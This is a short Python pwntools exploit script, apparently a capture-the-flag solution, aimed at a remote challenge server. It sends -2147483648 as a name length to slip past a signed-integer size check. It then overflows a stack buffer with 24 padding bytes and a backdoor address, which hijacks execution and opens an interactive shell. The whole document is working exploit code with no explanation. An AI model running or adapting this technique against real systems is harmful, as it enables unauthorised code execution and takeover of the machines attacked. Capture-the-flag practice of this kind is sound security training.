"""
整形溢出
"""

from pwn import *

#io = process("./pwn")
io = connect("node4.anna.nssctf.cn", 24122)

overflow_int = b"-2147483648"
backdoor_addr = 0x40072A
payload = b'a' * (0x10 + 0x8) + p64(backdoor_addr)

io.recvuntil(b"length of your name:")
io.sendline(overflow_int)
io.recvuntil(b"[+]What's u name?")
io.sendline(payload)
io.interactive()
